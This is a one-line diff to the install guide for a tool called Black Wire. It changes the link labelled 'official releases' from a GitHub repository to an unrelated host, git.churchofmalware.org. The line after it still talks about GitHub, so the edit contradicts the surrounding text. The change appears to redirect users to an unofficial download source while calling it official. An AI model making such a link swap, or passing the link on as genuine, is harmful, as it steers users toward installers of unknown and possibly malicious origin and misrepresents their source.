@@ -1,6 +1,6 @@
 # Install and update Black Wire
 
-Download from the [official releases](https://github.com/valleytechsolutions/BWM-Technical-Reference-Guide/releases/latest). GitHub's automatic source ZIP is not an installer.
+Download from the [official releases](https://git.churchofmalware.org/Valleytech/BWM-Technical-Reference-Guide/releases/latest). GitHub's automatic source ZIP is not an installer.
 
 ## Windows x64
 
